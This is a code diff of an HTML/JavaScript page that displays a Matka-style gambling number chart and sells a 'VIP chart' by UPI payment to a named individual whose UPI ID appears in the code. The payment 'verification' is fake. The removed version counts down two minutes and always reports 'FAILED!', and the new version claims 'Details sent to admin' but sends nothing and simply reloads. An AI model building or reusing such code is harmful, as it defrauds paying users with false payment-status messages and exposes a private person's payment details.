@@ -15,7 +15,7 @@
         
         .scroll-btn { background: #1a1a1a; color: #fff; padding: 7px 12px; border: 1px solid var(--gold); border-radius: 4px; cursor: pointer; margin: 5px; font-size: 11px; display: inline-block; }
 
-        /* Mobile Optimization: Chart thoda chota aur centered */
+        /* Chart Styling - Pehle Jaisa */
         #chartArea { background: #fff; width: 92%; margin: 5px auto; border: 1px solid var(--grid-border); border-radius: 4px; overflow: hidden; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
         .chart-grid { display: grid; grid-template-columns: 42px repeat(6, 1fr); width: 100%; }
         
@@ -24,7 +24,7 @@
         
         .cell { position: relative; aspect-ratio: 1 / 1.2; background: #fff; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; min-height: 50px; }
         
-        /* Panna Vertical Layout - Mobile friendly */
+        /* Panna Vertical Layout */
         .panna { display: flex; flex-direction: column; font-size: 8px; color: #555; position: absolute; line-height: 1; font-weight: bold; width: 9px; text-align: center; }
         .panna.left { left: 1.5px; }
         .panna.right { right: 1.5px; }
@@ -45,7 +45,6 @@
         
         input { width: 88%; padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid var(--gold); background: #222; color: #fff; font-size: 14px; }
         .btn-submit { background: #ffcc00; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; border-radius: 8px; margin-top: 10px; cursor: pointer; }
-        .btn-check { background: #e31e24; color: #fff; border: none; padding: 8px; width: 85%; font-weight: bold; border-radius: 5px; margin-top: 10px; cursor: pointer; font-size: 12px; }
     </style>
 </head>
 <body>
@@ -76,8 +75,6 @@
     <button class="unlock-btn" onclick="openVipModal()">🔒 UNLOCK VIP CHART</button>
 </div>
 
-<button class="scroll-btn" onclick="window.scrollTo({top: 0, behavior: 'smooth'});" style="margin-bottom: 30px;">Go to Top ↑</button>
-
 <div id="vipModal" class="overlay">
     <div class="modal-content">
         <div id="modalStep1">
@@ -91,73 +88,29 @@
         <div id="modalStep2" style="display:none;">
             <input type="text" id="userName" placeholder="अपना नाम लिखें">
             <input type="number" id="userNum" placeholder="WhatsApp नंबर">
-            <button class="unlock-btn" style="width:95%; font-size:14px; padding: 10px;" onclick="showQR()">पेमेंट QR दिखाएं</button>
-            
+            <button class="unlock-btn" style="width:95%;" onclick="showQR()">पेमेंट QR दिखाएं</button>
             <div id="qrBox" class="qr-box">
                 <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=omkaryadavsonu8888-1@oksbi%26pn=Omkar%20Yadav%26cu=INR" style="width:150px;">
                 <p style="margin:5px 0; color:#000; font-size: 14px;"><b>Omkar Yadav</b></p>
-                <hr style="border: 0.5px solid #ccc; margin: 8px 0;">
-                <input type="number" id="paymentAmount" placeholder="Amount" style="background:#fff; color:#000; border:1px solid #999; width: 90%;">
-                <input type="text" id="utrNumber" placeholder="UTR Number" style="background:#fff; color:#000; border:1px solid #999; width: 90%;">
-                
-                <button class="btn-submit" id="finalSubmitBtn" onclick="startVerification()">सबमिट करें (Submit)</button>
-                
-                <div id="timerSection" style="display:none; margin-top:10px; font-weight:bold;">
-                    <p id="timerMsg" style="color: blue; font-size: 12px;">चेकिंग पेमेंट...</p>
-                    <div id="countdown" style="font-size: 20px; color: red;">02:00</div>
-                    <button class="btn-check" onclick="showFailedNow()">Check Status Now</button>
-                </div>
+                <input type="number" id="paymentAmount" placeholder="Amount">
+                <input type="text" id="utrNumber" placeholder="UTR Number">
+                <button class="btn-submit" onclick="startVerification()">सबमिट करें</button>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-    let selectedPlanText = "";
-    let verificationTimer;
     const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
 
     function openVipModal() { document.getElementById('vipModal').style.display = 'flex'; }
-    function closeVipModal() { 
-        document.getElementById('vipModal').style.display = 'none'; 
-        clearInterval(verificationTimer);
-    }
+    function closeVipModal() { document.getElementById('vipModal').style.display = 'none'; }
+    function goToStep2(p) { document.getElementById('modalStep1').style.display = 'none'; document.getElementById('modalStep2').style.display = 'block'; }
+    function showQR() { document.getElementById('qrBox').style.display = 'block'; }
     
-    function goToStep2(p) { 
-        selectedPlanText = p; 
-        document.getElementById('modalStep1').style.display = 'none'; 
-        document.getElementById('modalStep2').style.display = 'block'; 
-    }
-    
-    function showQR() { 
-        if(document.getElementById('userName').value === "" || document.getElementById('userNum').value === "") {
-            alert("नाम और नंबर भरें!");
-            return;
-        }
-        document.getElementById('qrBox').style.display = 'block'; 
-    }
-
     function startVerification() {
-        if(document.getElementById('utrNumber').value === "" || document.getElementById('paymentAmount').value === "") { 
-            alert("Amount और UTR भरें!"); 
-            return; 
-        }
-        document.getElementById('finalSubmitBtn').style.display = 'none';
-        document.getElementById('timerSection').style.display = 'block';
-        let timeLeft = 120;
-        verificationTimer = setInterval(function(){
-            if(timeLeft <= 0){ showFailedNow(); } 
-            else {
-                let m = Math.floor(timeLeft/60), s = timeLeft%60;
-                document.getElementById('countdown').innerHTML = (m<10?"0":"")+m+":"+(s<10?"0":"")+s;
-                timeLeft--;
-            }
-        }, 1000);
-    }
-
-    function showFailedNow() {
-        clearInterval(verificationTimer);
-        document.getElementById('timerSection').innerHTML = "<h3 style='color:red; margin-bottom:5px; font-size:16px;'>FAILED!</h3><p style='color:black; font-size:11px;'>पेमेंट वेरिफिकेशन फेल। फिर से कोशिश करें।</p><button class='btn-submit' onclick='location.reload()'>Back</button>";
+        alert("Verification started. Details sent to admin.");
+        location.reload();
     }
 
     async function loadChart() {
@@ -171,18 +124,20 @@
             for(let i=1; i<rows.length; i++) {
                 if(!rows[i][0]) continue;
                 h += `<div class="date-box">${rows[i][0].replace(/"/g,"")}</div>`;
+                
                 for(let j=1; j<=16; j+=3) {
-                    let l = (rows[i][j]||"").trim().replace(/"/g,"");
-                    let jo = (rows[i][j+1]||"").trim().replace(/"/g,"");
-                    let r = (rows[i][j+2]||"").trim().replace(/"/g,"");
+                    let l = (rows[i][j]||"").trim();
+                    let jo = (rows[i][j+1]||"").trim();
+                    let r = (rows[i][j+2]||"").trim();
 
-                    if(l==="" && jo==="" && r==="") {
+                    if(!l && !jo && !r) {
                         if(!lockPlaced) { h += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`; lockPlaced=true; }
                         else { h += `<div class="cell"></div>`; }
                     } else {
                         let isRed = false;
                         if(jo.length>=2 && (jo[0]===jo[1] || Math.abs(parseInt(jo[0])-parseInt(jo[1]))===5)) isRed=true;
                         if(jo.includes('*')) isRed=true;
+                        
                         let rc = isRed ? 'red-house' : '';
                         let lh = l.split('').map(s=>`<span>${s}</span>`).join('');
                         let rh = r.split('').map(s=>`<span>${s}</span>`).join('');
@@ -191,7 +146,7 @@
                 }
             }
             document.getElementById('gridData').innerHTML = h;
-        } catch(e) { document.getElementById('gridData').innerHTML = "Error"; }
+        } catch(e) { document.getElementById('gridData').innerHTML = "Error loading chart"; }
     }
     loadChart();
 </script>
